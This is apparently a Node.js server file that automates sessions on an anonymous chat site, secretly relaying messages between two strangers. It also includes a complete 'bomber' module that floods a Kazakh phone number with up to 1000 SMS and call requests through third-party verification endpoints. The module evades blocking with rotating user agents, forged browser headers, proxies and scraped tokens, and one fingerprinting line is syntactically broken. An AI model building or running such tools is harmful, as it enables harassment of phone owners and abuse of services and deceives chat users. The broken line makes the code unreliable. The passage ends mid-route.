import http from 'node:http';
import {readFile,mkdir} from 'node:fs/promises';
import {timingSafeEqual} from 'node:crypto';
import {chromium} from 'playwright';
import {Relay,labels} from './relay.js';
import {withToken,validateTokens} from './session.js';
import {Transcript} from './transcript.js';
import {queueTextBroadcast} from './text-broadcast.js';
import {startConversation} from './connection.js';
import {prepareTextSession} from './prepare-session.js';
import {loadTokens,saveTokens} from './token-config.js';
import {ProviderVideoHost} from './provider-video-host.js';
import {AudioHost} from './audio-host.js';
import {closeSession} from './session-lifecycle.js';
import {textSessionDiagnostics} from './diagnostics.js';
import {fetch as uFetch,ProxyAgent} from 'undici';

const password=process.env.DASHBOARD_PASSWORD;
if(!password||password.length<16)throw new Error('Set DASHBOARD_PASSWORD (at least 16 characters)');
const relay=new Relay(),slots=Array(2).fill(null),locks=Array(2).fill(null),sessions=new Set();
let configuredTokens=[null,null],tokenSetup=false;
const tokenStatus=[false,false],transcripts=[new Transcript(),new Transcript()];
relay.toggle(true);
const safeError=e=>{let text=String(e?.message||e);for(const token of configuredTokens)if(token)text=text.split(token).join('[redacted]');return text.slice(0,180);};
const data=process.env.TEXT_DATA_DIR||'/data/text-host';await mkdir(data,{recursive:true});configuredTokens=await loadTokens(data);
let browser=null,launching=null,videoBrowser=null,videoLaunching=null;
async function getVideoBrowser(){if(videoBrowser?.isConnected())return videoBrowser;if(!videoLaunching)videoLaunching=chromium.launch({headless:true,args:['--disable-dev-shm-usage','--autoplay-policy=no-user-gesture-required','--use-fake-device-for-media-stream','--js-flags=--max-old-space-size=128']}).then(b=>{videoBrowser=b;return b;}).finally(()=>videoLaunching=null);return videoLaunching;}
const video=new ProviderVideoHost({getBrowser:getVideoBrowser,data}),videoOps=new Set();
const audio=new AudioHost({data});
const injection=await readFile(new URL('./browser/adapter.js',import.meta.url),'utf8')+'\n'+await readFile(new URL('./browser/runtime.js',import.meta.url),'utf8');
const site='https://nekto-me.kz/chat/';
async function getBrowser(){if(browser?.isConnected())return browser;if(!launching)launching=chromium.launch({headless:true,args:['--disable-dev-shm-usage']}).then(b=>{browser=b;return b;}).finally(()=>launching=null);return launching;}
async function open(i){
 if(audio.hasOpen())throw Error('Close audio sessions before opening text sessions.');if(slots[i])return;const b=await getBrowser();let saved;try{saved=JSON.parse(await readFile(data+'/slot-'+i+'.json','utf8'));}catch{}
 const token=configuredTokens[i];
 if(token){const imported=withToken(saved,token);saved=imported.state;tokenStatus[i]=false;}
 const context=await b.newContext({viewport:{width:420,height:760},locale:'ru-RU',storageState:saved});
 await context.addInitScript({content:injection});const page=await context.newPage();
 const slot={page,context,busy:false,lastSend:0,opening:true,saveAt:0,status:'loading',detail:'',bootstrapToken:null,preparedToken:null};slots[i]=slot;
 page.on('dialog',dialog=>dialog.dismiss().catch(()=>{}));page.on('popup',p=>p.close().catch(()=>{}));
 page.on('crash',()=>{relay.members[i].error='Browser page crashed. Close and reopen this session.';relay.update(i,{connected:false,epoch:null});});
 try{await page.goto(site,{waitUntil:'domcontentloaded',timeout:45000});
  await context.storageState({path:data+'/slot-'+i+'.json'});}catch(e){slots[i]=null;await context.close().catch(()=>{});operationError(i,e);throw e;}finally{slot.opening=false;}
}
function operationError(i,e){const error=safeError(e);const changed=relay.members[i].error!==error;relay.members[i].error=error;if(changed)console.warn(JSON.stringify({event:'session_operation_failed',slot:labels[i],error}));return error;}
async function closeSlot(i,expected=slots[i]){const previous=locks[i];locks[i]=true;try{return await closeSession({slots,index:i,expected,relay,transcript:transcripts[i],tokenStatus,path:data+'/slot-'+i+'.json'});}finally{locks[i]=previous;}}
async function authorize(i,{force=false}={}){
 const s=slots[i],token=configuredTokens[i];if(!token||s.preparedToken===token)return;
 const reload=false;s.bootstrapToken=token;s.preparedToken=null;s.status='loading';tokenStatus[i]=false;
 const result=await prepareTextSession(s.page,token,{reload});
 s.preparedToken=token;tokenStatus[i]=true;
 await s.context.storageState({path:data+'/slot-'+i+'.json'});
 console.log(JSON.stringify({event:'token_authorization',slot:labels[i],reason:result.reason,refreshed:result.refreshed,applications:result.applications,results:result.results}));
}
async function connect(i){
 try{await open(i);await authorize(i);const s=slots[i];const state=await startConversation(s.page,{onState:state=>{s.status=state.status;s.detail=state.detail;}});console.log(JSON.stringify({event:'search_started',slot:labels[i],status:state.status}));}
 catch(e){operationError(i,e);throw e;}
}
async function tick(i){const s=slots[i];if(!s||s.busy||s.opening||locks[i])return;s.busy=true;
 try{
  if(!new URL(s.page.url()).hostname.match(/(^|\.)nekto-me\.kz$/)){relay.update(i,{connected:false,epoch:null});return;}
  const state=await s.page.evaluate(()=>window.__textHost?.poll());if(!state)return;s.verification=state.verification;relay.update(i,state);if(s.status!==state.status)console.log(JSON.stringify({event:'session_status',slot:labels[i],status:state.status,verification:state.verification}));s.status=state.status;s.detail=state.detail;transcripts[i].reset(state.epoch);
  if(state.ended||state.status==='ended'){await closeSlot(i,s);console.log(JSON.stringify({event:'session_closed',slot:labels[i],reason:'stranger-disconnected'}));return;}
  const m=relay.members[i];for(const msg of state.messages){transcripts[i].add('incoming',msg.text);relay.incoming(i,msg.text);}
  while(m.queue.length&&!relay.valid(i,m.queue[0])){const dropped=m.queue.shift();const row=transcripts[i].items.find(r=>r.id===dropped.transcriptId);if(row)row.delivery='failed';}
  if(m.queue.length&&Date.now()-s.lastSend>=1100){const item=m.queue[0];
   if(item.source!=null){const source=slots[item.source];const current=source?await source.page.evaluate(()=>window.__textHost?.status()):null;if(!current?.connected||current.epoch!==item.sourceEpoch){m.queue.shift();return;}}
   const result=await s.page.evaluate(({text,epoch})=>window.__textHost.send(text,epoch),{text:item.text,epoch:item.targetEpoch});
   if(result==='confirmed'||result==='submitted'){s.lastSend=Date.now();m.queue.shift();let cleared=result==='confirmed';for(let n=0;n<10&&!cleared;n++){await new Promise(r=>setTimeout(r,100));cleared=await s.page.evaluate(()=>window.__textHost.cleared());if(cleared)break;}if(cleared){m.sent++;m.error='';if(item.transcriptId){const row=transcripts[i].items.find(r=>r.id===item.transcriptId);if(row)row.delivery='sent';}else transcripts[i].add('relay',item.text);}else{const row=transcripts[i].items.find(r=>r.id===item.transcriptId);if(row)row.delivery='failed';m.error='The site did not confirm sending this message. Reconnect this chat before retrying.';}}
   else if(result==='draft'||result==='wait')m.error=result==='draft'?'Delivery paused: this session already contains an unsent draft. Reconnect to clear it.':'Waiting for the site to enable sending.';
   else{m.queue.shift();const row=transcripts[i].items.find(r=>r.id===item.transcriptId);if(row)row.delivery='failed';m.error='Delivery stopped: '+result;}
  }
  if(Date.now()-s.saveAt>60000){s.saveAt=Date.now();await s.context.storageState({path:data+'/slot-'+i+'.json'});}
 }catch(e){operationError(i,e);relay.update(i,{connected:false,epoch:null});}finally{s.busy=false;}
}
setInterval(()=>{for(let i=0;i<2;i++)void tick(i);},700);
function json(res,status,value){res.writeHead(status,{'Content-Type':'application/json','Cache-Control':'no-store'});res.end(JSON.stringify(value));}
async function body(req,limit=12000){let chunks=[],size=0;for await(const chunk of req){size+=chunk.length;if(size>limit)throw new Error('Request too large');chunks.push(chunk);}try{return JSON.parse(Buffer.concat(chunks).toString()||'{}');}catch{throw new Error('Invalid JSON request body');}}
const KZ_MOBILE_PREFIXES=new Set(['700','701','702','703','704','705','706','707','708','747','750','751','760','761','762','763','771','775','776','777','778']);
const DEFAULT_UAS=[
 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/154.0.0.0 Safari/537.36',
 'Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/154.0.0.0 Mobile Safari/537.36',
 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148',
 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/153.0.0.0 Safari/537.36',
 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/154.0.0.0 Safari/537.36',
 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0',
 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/153.0.0.0 Safari/537.36'
];
function randOf(a){return a[Math.floor(Math.random()*a.length)];}
function randDelay(min,max){return Math.floor(min+Math.random()*Math.max(1,max-min));}
function shuffle(a){const r=a.slice();for(let i=r.length-1;i>0;i--){const j=Math.floor(Math.random()*(i+1));[r[i],r[j]]=[r[j],r[i]];}return r;}
function uaFingerprint(ua){
 const chrome=ua.match(/Chrome\/(\d+)/);
 if(chrome){
  const v=chrome[1];
  const mobile=/Mobile|Android|iPhone/.test(ua)?'?1':'?0';
  const platform=/Android/.test(ua)?'"Android"':/iPhone|iPad/.test(ua)?'"iOS"':/Mac OS X/.test(ua)?'"macOS"':'/Linux/.test(ua)?'"Linux"':'"Windows"';
  return{secChUa:'"Chromium";v="'+v+'", "Google Chrome";v="'+v+'", "Not A(Brand";v="99"',mobile,platform};
 }
 const ff=ua.match(/Firefox\/(\d+)/);
 if(ff)return{secChUa:null,mobile:'?0',platform:/Linux/.test(ua)?'"Linux"':'"Windows"'};
 return{secChUa:'"Chromium";v="154", "Google Chrome";v="154", "Not A(Brand";v="99"',mobile:'?0',platform:'"Windows"'};
}
function normalizeKzPhone(raw){
 let digits=String(raw||'').replace(/\D/g,'');
 if(digits.length===11&&(digits[0]==='8'||digits[0]==='7'))digits=digits.slice(1);
 if(digits.length!==10)return{e164:null,e164_enc:null,raw:null,local8:null,national:null,display:null,display_enc:null,display_space:null,display_space_enc:null,prefix:null,valid:false,error:`expected 10 national digits, got ${digits.length}`};
 const prefix=digits.slice(0,3),valid=KZ_MOBILE_PREFIXES.has(prefix),e164='+7'+digits;
 const display=`+7 (${digits.slice(0,3)}) ${digits.slice(3,6)}-${digits.slice(6,8)}-${digits.slice(8,10)}`;
 const display_space=`+7 (${digits.slice(0,3)}) ${digits.slice(3,6)} ${digits.slice(6,8)} ${digits.slice(8,10)}`;
 return{e164,e164_enc:encodeURIComponent(e164),raw:'7'+digits,local8:'8'+digits,national:digits,display,display_enc:encodeURIComponent(display),display_space,display_space_enc:encodeURIComponent(display_space),prefix,valid,error:valid?null:`prefix ${prefix} not in KZ mobile set`};
}
function substitutePhone(template,forms){
 if(!template)return'';
 let out=String(template);
 const pairs=[['{phone_display_space_enc}',forms.display_space_enc],['{phone_display_space}',forms.display_space],['{phone_display_enc}',forms.display_enc],['{phone_display}',forms.display],['{phone_e164_enc}',forms.e164_enc],['{phone_national}',forms.national],['{phone_raw}',forms.raw],['{phone_8}',forms.local8],['{phone_prefix}',forms.prefix],['{phone}',forms.e164]];
 for(const[k,v]of pairs)out=out.split(k).join(v||'');
 return out;
}
async function loadBomberConfig(){
 const data=JSON.parse(await readFile(new URL('./endpoints.json',import.meta.url),'utf8'));
 const endpoints=(data.endpoints||[]).filter(e=>e.enabled!==false).map(e=>({name:e.name,method:(e.method||'POST').toUpperCase(),url:e.url,channel:(e.channel||'sms').toLowerCase(),contentType:e.content_type||'application/json',body:e.body||'',headers:e.headers||{},preRequest:e.pre_request||null,variants:e.variants||null}));
 return{endpoints,threads:Number(data.threads??6),delayMinMs:Number(data.delay_min_ms??200),delayMaxMs:Number(data.delay_max_ms??1400),timeoutSec:Number(data.timeout_sec??10),userAgents:data.user_agents||DEFAULT_UAS,proxies:data.proxies||[],simulation:data.simulation_mode??true,smsPerMinute:Number(data.sms_per_minute??60),perEndpointCooldownMs:Number(data.per_endpoint_cooldown_ms??5000)};
}
async function fireEndpoint(ep,forms,cfg,roundUA,roundProxy){
 const result={name:ep.name,channel:ep.channel,ok:false,status:null,snippet:''};
 if(cfg.simulation){result.ok=true;result.status=200;result.snippet='simulated';return result;}
 const variant=ep.variants&&ep.variants.length?randOf(ep.variants):null;
 const baseHeaders={...(ep.headers||{}),...(variant?.headers||{})};
 const baseUrl=variant?.url||ep.url;
 const baseBody=variant?.body||ep.body;
 let url=substitutePhone(baseUrl,forms),bodyStr=substitutePhone(baseBody,forms);
 const headers={};
 for(const[k,v]of Object.entries(baseHeaders))headers[k]=substitutePhone(String(v),forms);
 const ua=roundUA||randOf(cfg.userAgents);
 if(!headers['User-Agent'])headers['User-Agent']=ua;
 if(!headers['Accept-Language'])headers['Accept-Language']='en-US,en;q=0.9,ru-RU;q=0.8,ru;q=0.7';
 const fp=uaFingerprint(ua);
 if(fp.secChUa&&!headers['Sec-CH-UA'])headers['Sec-CH-UA']=fp.secChUa;
 if(!headers['Sec-CH-UA-Mobile'])headers['Sec-CH-UA-Mobile']=fp.mobile;
 if(!headers['Sec-CH-UA-Platform'])headers['Sec-CH-UA-Platform']=fp.platform;
 if(!headers['Sec-Fetch-Dest'])headers['Sec-Fetch-Dest']='empty';
 if(!headers['Sec-Fetch-Mode'])headers['Sec-Fetch-Mode']='cors';
 if(!headers['Sec-Fetch-Site'])headers['Sec-Fetch-Site']='same-origin';
 if(ep.contentType&&!headers['Content-Type'])headers['Content-Type']=ep.contentType;
 let dispatcher=undefined;
 if(roundProxy){try{dispatcher=new ProxyAgent(roundProxy);}catch{}}
 let preCookies='',extraHeader=null;
 if(ep.preRequest){
  const preUrl=substitutePhone(ep.preRequest.url||'',forms);
  const preMethod=(ep.preRequest.method||'GET').toUpperCase();
  const preHeaders={'User-Agent':ua,'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8','Accept-Language':headers['Accept-Language']};
  if(fp.secChUa){preHeaders['Sec-CH-UA']=fp.secChUa;preHeaders['Sec-CH-UA-Mobile']=fp.mobile;preHeaders['Sec-CH-UA-Platform']=fp.platform;}
  Object.assign(preHeaders,ep.preRequest.headers||{});
  try{
   const preRes=await uFetch(preUrl,{method:preMethod,headers:preHeaders,redirect:'manual',dispatcher});
   const text=await preRes.text();
   const setCookies=preRes.headers.getSetCookie?preRes.headers.getSetCookie():[];
   preCookies=setCookies.map(c=>c.split(';')[0]).join('; ');
   const extract=ep.preRequest.extract||{};
   let token='';
   if(extract.pattern){const m=text.match(new RegExp(extract.pattern));token=m?m[1]:'';}
   if(extract.into){bodyStr=bodyStr.split(extract.into).join(token);url=url.split(extract.into).join(token);}
   if(extract.header)extraHeader=[extract.header,token];
  }catch(e){result.snippet='PRE_ERR:'+String(e.message||e).slice(0,100);return result;}
 }
 if(extraHeader)headers[extraHeader[0]]=extraHeader[1];
 if(preCookies)headers['Cookie']=headers['Cookie']?headers['Cookie']+'; '+preCookies:preCookies;
 const controller=new AbortController();
 const timer=setTimeout(()=>controller.abort(),cfg.timeoutSec*1000);
 try{
  const opts={method:ep.method,headers,redirect:'manual',signal:controller.signal};
  if(dispatcher)opts.dispatcher=dispatcher;
  if(ep.method!=='GET'&&ep.method!=='HEAD')opts.body=bodyStr;
  const r=await uFetch(url,opts);
  result.status=r.status;
  result.ok=r.status>=200&&r.status<400;
  const loc=r.headers.get('location')||'';
  if(loc)result.snippet=loc.slice(0,120);
  else{const t=await r.text();result.snippet=t.slice(0,120).replace(/\n/g,' ');}
 }catch(e){result.snippet=String(e.message||e).slice(0,120);}
 finally{clearTimeout(timer);}
 return result;
}
const bomberJobs=new Map();
const JOB_TTL_MS=60*60*1000;
function pruneBomberJobs(){const t=Date.now();for(const[id,j]of bomberJobs)if(t-j.startedAt>JOB_TTL_MS)bomberJobs.delete(id);}
async function runBomberJob(rawPhone,count,channel,simulation,liveProxies){
 pruneBomberJobs();
 if(!Number.isInteger(count)||count<1||count>1000)throw new Error('count must be 1..1000');
 const forms=normalizeKzPhone(rawPhone);
 if(!forms.e164)throw new Error(forms.error);
 if(!forms.valid)throw new Error(forms.error+' (use ! to force)');
 let want;
 if(channel==='sms')want=new Set(['sms']);
 else if(channel==='voice'||channel==='call')want=new Set(['voice','call']);
 else want=new Set(['sms','voice','call']);
 const cfg=await loadBomberConfig();
 cfg.simulation=simulation!==false;
 if(Array.isArray(liveProxies)&&liveProxies.length)cfg.proxies=liveProxies;
 const id=Math.random().toString(36).slice(2,10);
 const job={id,phone:forms.e164,total:count,sent:0,failed:0,done:false,stopped:false,stopRequested:false,events:[],startedAt:Date.now(),forms,cfg,want,rounds:count};
 bomberJobs.set(id,job);
 (async()=>{
  try{
   const eligible=cfg.endpoints.filter(e=>want.has(e.channel));
   if(eligible.length){
    const perMinute=Math.max(1,cfg.smsPerMinute);
    const intervalMs=Math.max(50,Math.floor(60000/perMinute));
    const cooldown=Math.max(500,cfg.perEndpointCooldownMs);
    const lastHit=new Map();
    const active=new Set();
    const total=count;
    let dispatched=0;
    const tickOnce=()=>{
     if(job.stopRequested||dispatched>=total)return;
     const now=Date.now();
     const candidates=eligible.filter(ep=>!active.has(ep.name)&&now-(lastHit.get(ep.name)||0)>=cooldown);
     if(!candidates.length)return;
     const ep=randOf(candidates);
     active.add(ep.name);
     lastHit.set(ep.name,now);
     dispatched++;
     const roundUA=randOf(cfg.userAgents);
     const roundProxy=cfg.proxies.length?randOf(cfg.proxies):null;
     (async()=>{
      try{
       const r=await fireEndpoint(ep,forms,cfg,roundUA,roundProxy);
       if(r.ok)job.sent++;else job.failed++;
       job.events.push({seq:job.events.length+1,phone:forms.e164,channel:r.channel,name:r.name,status:r.ok?'sent':'failed',http:r.status,error:r.ok?null:(r.snippet||'').slice(0,120)});
      }catch(e){
       job.failed++;
       job.events.push({seq:job.events.length+1,phone:forms.e164,channel:ep.channel,name:ep.name,status:'failed',http:null,error:String(e.message||e).slice(0,120)});
      }finally{active.delete(ep.name);}
     })();
    };
    await new Promise(resolve=>{
     const timer=setInterval(()=>{
      if(job.stopRequested){clearInterval(timer);resolve();return;}
      if(dispatched>=total&&active.size===0){clearInterval(timer);resolve();return;}
      tickOnce();
     },intervalMs);
    });
   }
  }catch(err){
   job.events.push({seq:job.events.length+1,phone:forms.e164,channel:'system',name:'worker',status:'failed',http:null,error:String(err.message||err).slice(0,160)});
  }finally{job.done=true;}
 })();
 return{id,phone:forms.e164,total:count};
}
function snapshotBomberJob(j){
 return{id:j.id,phone:j.phone,total:j.total,sent:j.sent,failed:j.failed,done:j.done,stopped:j.stopped,elapsed:Math.round((Date.now()-j.startedAt)/100)/10,events:j.events};
}
async function handleBomberRoute(req,res,pathname){
 if(pathname==='/api/dispatch'&&req.method==='POST'){
  try{
   const b=await body(req);
   const out=await runBomberJob(String(b.phone||'').trim(),Number(b.count||1),String(b.channel||'both').toLowerCase(),b.simulation!==false,Array.isArray(b.proxies)?b.proxies:null);
   json(res,200,out);
  }catch(e){json(res,400,{error:e.message||'dispatch failed'});}
  return true;
 }
 const jobMatch=pathname.match(/^\/api\/job\/([a-z0-9]+)$/);
 if(jobMatch&&req.method==='GET'){
  const j=bomberJobs.get(jobMatch[1]);
  if(!j){json(res,404,{error:'not found'});return true;}
  json(res,200,snapshotBomberJob(j));
  return true;
 }
 const stopMatch=pathname.match(/^\/api\/job\/([a-z0-9]+)\/stop$/);
 if(stopMatch&&req.method==='POST'){
  const j=bomberJobs.get(stopMatch[1]);
  if(j)j.stopRequested=true;
  json(res,200,{ok:true});
  return true;
 }
 return false;
}
const failures=new Map();
const server=http.createServer(async(req,res)=>{try{
 const url=new URL(req.url,'http://localhost');res.setHeader('X-Content-Type-Options','nosniff');res.setHeader('Referrer-Policy','no-referrer');res.setHeader('Cache-Control','no-store');
 if(url.pathname==='/health')return json(res,200,{ok:true,service:'nekto-text-host'});
 if(req.method==='GET'&&['/','/app.js','/style.css','/video','/video.js','/video.css','/stream-player.js','/video-fixture','/audio','/audio.js','/audio.css','/simulator','/simulator.js','/eye-a.png','/eye-b.jpg'].includes(url.pathname)){
  if(url.pathname==='/video-fixture'){res.setHeader('Content-Type','text/html');return res.end('<!doctype html><body>Generated media test</body>');}
  const name=url.pathname==='/'?'index.html':url.pathname==='/video'?'video.html':url.pathname==='/audio'?'audio.html':url.pathname==='/simulator'?'simulator.html':url.pathname.slice(1);res.setHeader('Content-Type',name.endsWith('.png')?'image/png':name.endsWith('.jpg')?'image/jpeg':name.endsWith('.js')?'text/javascript':name.endsWith('.css')?'text/css':'text/html');if(/\.(png|jpg)$/.test(name))res.setHeader('Cache-Control','public, max-age=86400');return res.end(await readFile(new URL((name==='stream-player.js'?'./browser/':'./public/')+name,import.meta.url)));}
 if(req.method==='POST'){
  const origin=req.headers.origin;if(origin&&origin!== 'https://'+req.headers.host&&origin!=='http://'+req.headers.host)return json(res,403,{error:'Invalid origin'});
 }
 if(url.pathname==='/api/login'&&req.method==='POST'){
  const ip=req.socket.remoteAddress,record=failures.get(ip)||{count:0,at:Date.now()};if(Date.now()-record.at>600000){record.count=0;record.at=Date.now();}if(record.count>=15)return json(res,429,{error:'Too many attempts. Wait 10 minutes.'});
  const b=await body(req),a=Buffer.from(String(b.password||'')),p=Buffer.from(password);if(a.length!==p.length||!timingSafeEqual(a,p)){record.count++;failures.set(ip,record);return json(res,401,{error:'Incorrect password'});}
  const token=crypto.randomUUID();sessions.add(token);setTimeout(()=>sessions.delete(token),86400000).unref();res.setHeader('Set-Cookie','session='+token+'; HttpOnly; SameSite=Strict; Path=/; Max-Age=86400'+(process.env.NODE_ENV==='production'?'; Secure':''));return json(res,200,{ok:true});
 }
 const token=(req.headers.cookie||'').split(';').map(x=>x.trim()).find(x=>x.startsWith('session='))?.slice(8);if(!sessions.has(token))return json(res,401,{error:'Sign in first'});
 if(await handleBomberRoute(req,res,url.pathname))return;
 if(url.pathname==='/api/audio/status'&&req.method==='GET'){await audio.loaded;return json(res,200,audio.status());}
 if(url.pathname==='/api/audio/tokens'&&req.method==='GET'){await audio.loaded;return json(res,200,{tokens:audio.tokens});}
 if(url.pathname==='/api/audio/proxies'&&req.method==='GET'){await audio.loaded;return json(res,200,{proxies:audio.proxies});}
 const audioScreen=url.pathname.match(/^\/api\/audio\/([01])\/screen$/);if(audioScreen&&req.method==='GET'){const frame=await audio.screen(Number(audioScreen[1]));if(!frame){res.writeHead(204);return res.end();}res.writeHead(200,{'Content-Type':'image/jpeg','Cache-Control':'no-store','X-Screen-Time':String(frame.at),'X-Screen-Epoch':frame.epoch});return res.end(frame.bytes);}
 if(url.pathname.startsWith('/api/audio/')&&req.method==='POST'){
  if((slots.some(Boolean)||video.slots.some(Boolean))&&!/\/(close|consent|proxies)$/.test(url.pathname))return json(res,409,{error:'Close text and video sessions before starting audio.'});
  const b=await body(req);try{
   if(url.pathname==='/api/audio/proxies')return json(res,200,await audio.configureProxies(b.proxies));
   const control=url.pathname.match(/^\/api\/audio\/([01])\/(input|inspect|reload|ip)$/);if(control){
    const i=Number(control[1]);
    const result=control[2]==='input'?await audio.input(i,b):control[2]==='reload'?await audio.reloadPage(i,b.epoch):control[2]==='ip'?await audio.checkIp(i,b.epoch):await audio.inspect(i);
    return json(res,200,result);
   }
   if(url.pathname==='/api/audio/tokens')return json(res,200,await audio.apply(b.tokens,b.consent));
   const single=url.pathname.match(/^\/api\/audio\/([01])\/token$/);if(single)return json(res,200,await audio.applySingle(Number(single[1]),b.token));
   const check=url.pathname.match(/^\/api\/audio\/([01])\/check$/);if(check)return json(res,200,await audio.applySingle(Number(check[1]),b.token,{startCall:false}));
   if(url.pathname==='/api/audio/connect'){await audio.consent(b.consent);return json(res,200,await audio.connectBoth());}
   if(url.pathname==='/api/audio/consent'){await audio.consent(b.consent);return json(res,200,{ok:true});}
   const m=url.pathname.match(/^\/api\/audio\/([01])\/(start|next|close)$/);if(m){const i=Number(m[1]);if(m[2]!=='close')await audio.start(i,{next:m[2]==='next'});else{if(audio.ops.has(i)||audio.setup)throw Error('Audio session is busy.');await audio.close(i);}return json(res,200,{ok:true});}
   return json(res,404,{error:'Unknown audio operation'});
  }catch(e){return json(res,400,{error:audio.error(e)});}
 }
 const audioStream=url.pathname.match(/^\/api\/audio\/([01])\/stream$/);if(audioStream&&req.method==='GET'){const i=Number(audioStream[1]);if(!audio.slots[i]||audio.slots[i].stopped)return json(res,409,{error:'Connect this audio side first.'});return audio.subscribe(i,res);}
 if(audio.hasOpen()&&url.pathname.startsWith('/api/video/')&&req.method==='POST'&&!/\/(close|toggle)$/.test(url.pathname))return json(res,409,{error:'Close audio sessions before starting video.'});
 if(url.pathname==='/api/video/status'&&req.method==='GET'){await video.sessionsLoaded;return json(res,200,video.status());}
 if(url.pathname==='/api/video/sessions'&&req.method==='GET'){await video.sessionsLoaded;return json(res,200,{provider:video.provider,sessions:video.sessions});}
 if(url.pathname==='/api/video/diagnostics'&&req.method==='GET')return json(res,200,await video.inspect());
 if(['/api/video/validate','/api/video/sessions','/api/video/provider'].includes(url.pathname)&&req.method==='POST'){
  if(video.sessionSetup||videoOps.size||video.slots.some(s=>s?.busy))return json(res,409,{error:'Video session is busy.'});
  video.sessionSetup=true;
  try{const b=await body(req,260000);video.sessionSetup=false;return json(res,200,url.pathname.endsWith('/provider')?await video.selectProvider(b.provider):url.pathname.endsWith('/sessions')?await video.applySessions(b.sessions):await video.validateSessions());}
  catch(e){return json(res,400,{error:video.safeError(e)});}finally{video.sessionSetup=false;}
 }
 const videoScreen=url.pathname.match(/^\/api\/video\/([01])\/screen$/);
 if(videoScreen&&req.method==='GET'){const screen=await video.screen(Number(videoScreen[1]));if(!screen){res.writeHead(204);return res.end();}res.writeHead(200,{'Content-Type':'image/jpeg','X-Video-Epoch':screen.epoch,'Cache-Control':'no-store'});return res.end(screen.bytes);}
 const videoInput=url.pathname.match(/^\/api\/video\/([01])\/input$/);
 if(videoInput&&req.method==='POST'){try{return json(res,200,await video.input(Number(videoInput[1]),await body(req)));}catch(e){return json(res,400,{error:video.safeError(e)});}}
 if(url.pathname==='/api/video/toggle'&&req.method==='POST'){const b=await body(req);await video.toggle(!!b.enabled,!!b.consent);return json(res,200,{ok:true});}
 if(url.pathname==='/api/video/test'&&req.method==='POST')return json(res,200,await video.test(Number(process.env.PORT||3000)));
 const videoMatch=url.pathname.match(/^\/api\/video\/([01])\/(start|close|send|stream)$/);
 if(videoMatch){const i=Number(videoMatch[1]),operation=videoMatch[2];if(operation==='stream'&&req.method==='GET')return video.subscribe(i,res);if(req.method!=='POST')return json(res,405,{error:'POST required'});const b=await body(req);if(video.sessionSetup||video.slots[i]?.busy||videoOps.has(i))return json(res,409,{error:'Video session is busy'});videoOps.add(i);try{if(operation==='start')await video.start(i);else if(operation==='close')await video.close(i);else if(operation==='send')await video.send(i,b.text);else return json(res,404,{error:'Unknown video operation'});return json(res,200,{ok:true});}catch(e){return json(res,400,{error:video.safeError(e)});}finally{videoOps.delete(i);}}
 if(url.pathname==='/api/status')return json(res,200,{enabled:relay.enabled,tokenSetup,slots:relay.members.map((m,i)=>({...m,queue:m.queue.length,label:labels[i],open:!!slots[i],busy:!!locks[i]||!!slots[i]?.opening,opening:!!slots[i]?.opening,tokenImported:tokenStatus[i],verification:slots[i]?.verification||null,status:slots[i]?.status||'closed',detail:slots[i]?.detail||'',messages:transcripts[i].items}))});
 if(url.pathname==='/api/tokens'&&req.method==='GET')return json(res,200,{tokens:configuredTokens});
 if(url.pathname==='/api/tokens'&&req.method==='POST'){
  if(audio.hasOpen())return json(res,409,{error:'Close audio sessions before changing text tokens.'});
  if(tokenSetup||locks.some(Boolean)||slots.some(s=>s?.opening))return json(res,409,{error:'Wait for the current session operation to finish.'});
  const values=validateTokens((await body(req)).tokens);tokenSetup=true;relay.toggle(false);
  try{for(let i=0;i<2;i++){locks[i]=true;const s=slots[i];if(s)while(s.busy)await new Promise(r=>setTimeout(r,50));relay.update(i,{connected:false,epoch:null});transcripts[i].reset(null);tokenStatus[i]=false;if(s)s.preparedToken=null;}
   configuredTokens=await saveTokens(data,values);relay.toggle(true);const results=[];for(let i=0;i<2;i++){try{await connect(i);results.push({slot:i,ok:true,tokenImported:tokenStatus[i]});}catch(e){const error=operationError(i,e);results.push({slot:i,ok:false,error,tokenImported:tokenStatus[i]});}}
   return json(res,200,{ok:results.every(r=>r.ok),results});
  }finally{locks.fill(null);tokenSetup=false;}
 }
 if(url.pathname==='/api/toggle'&&req.method==='POST'){relay.toggle(!!(await body(req)).enabled);return json(res,200,{ok:true});}
 if(url.pathname==='/api/send'&&req.method==='POST'){
  const b=await body(req);
  if(tokenSetup||locks.some(Boolean)||slots.some(s=>!s||s.opening))return json(res,409,{error:'Wait for both chat sessions to be ready.'});
  locks.fill(true);
  try{
   while(slots.some(s=>s?.busy))await new Promise(r=>setTimeout(r,50));
   const states=await Promise.all(slots.map(s=>s.page.evaluate(()=>window.__textHost?.status())));
   return json(res,200,queueTextBroadcast({relay,transcripts,states,text:b.text,epochs:b.epochs}));
  }finally{locks.fill(null);}
 }
 if(url.pathname==='/api/diagnostics'&&req.method==='GET'){const diagnostics=await Promise.all(slots.map(async(s,i)=>({label:labels[i],open:!!s,...(s?await s.page.evaluate(textSessionDiagnostics,{expectedToken:configuredTokens[i]}):{})})));return json(res,200,{slots:diagnostics});}
 const match=url.pathname.match(/^\/api\/slot\/([01])\/(connect|close|send|inspect)$/);if(!match)return json(res,404,{error:'Not found'});
 const i=Number(match[1]),operation=match[2];
 if(req.method!=='POST')return json(res,405,{error:'POST required'});if(tokenSetup||locks[i])return json(res,409,{error:'Session is busy'});
 locks[i]=true;try{
  const s=slots[i];if(s)while(s.busy)await new Promise(r=>setTimeout(r,50));
  if(operation==='inspect'){await open(i);}
  else if(operation==='connect'){relay.members[i].error='';if(!relay.enabled)relay.toggle(true);await connect(i);}
  else if(operation==='close'){await closeSlot(i,s);}
  else{
   if(!s)throw new Error('Connect this chat first.');const b=await body(req);
